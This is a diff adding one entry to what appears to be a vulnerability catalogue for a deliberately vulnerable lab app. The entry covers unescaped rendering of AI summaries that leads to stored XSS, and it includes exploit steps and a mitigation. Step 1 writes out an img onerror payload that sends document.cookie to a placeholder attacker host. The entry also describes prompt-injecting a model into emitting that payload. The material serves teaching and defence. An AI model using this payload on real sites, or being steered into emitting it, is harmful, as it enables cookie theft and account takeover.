@@ -662,6 +662,31 @@ V-SOC-086  Few-shot poisoning via /admin/upload writable example file (LLM04)
               upload; remove V-SOC-061 (force a sanitised filename).
 
 
+V-SOC-087  Improper output handling: AI summary rendered as HTML -> stored XSS (LLM05)
+  Location:  views/ai.ejs renders the model output with <%- %> (unescaped)
+             in the "Rendered card (moderator preview)" panel AND in the
+             "Rendered card" column of the public Recent-activity table.
+             The response is also written to ai_logs (V-SOC-082), so the
+             payload persists and re-renders for every later viewer.
+  Exploit:   1. As any logged-in user (e.g. aria), create a post whose body
+                carries an HTML payload the model will echo, e.g.:
+                  POST /p  body=<img src=x onerror="new Image().src='http://ATTACKER/c?'+document.cookie">
+                (With the stub LLM the post body is echoed verbatim into the
+                summary; with a real model, prompt-inject it to emit the tag.)
+             2. POST /ai-summary/summarize  post_id=<that-post>
+                -- the model output (containing the <img onerror>) is stored
+                in ai_logs and rendered UNESCAPED in the moderator card.
+             3. Any moderator/admin who opens /ai-summary (to triage the
+                public activity feed, V-SOC-082) executes the payload in
+                their session -> cookie theft -> account takeover.
+             This chains LLM01 (prompt injection) -> LLM05 (improper output
+             handling) -> stored XSS -> ATO with no privilege to start.
+  Mitigation: treat model output as untrusted; render with <%= %> (escape)
+              everywhere; if formatting is needed, run the text through a
+              strict markdown renderer that forbids raw HTML, javascript:
+              URIs, and event handlers, and only allow-listed link hosts;
+              add a Content-Security-Policy that blocks inline handlers.
+
 -----------------------------------------------------------------
 QUICK REFERENCE (PowerShell 5.1)
 -----------------------------------------------------------------
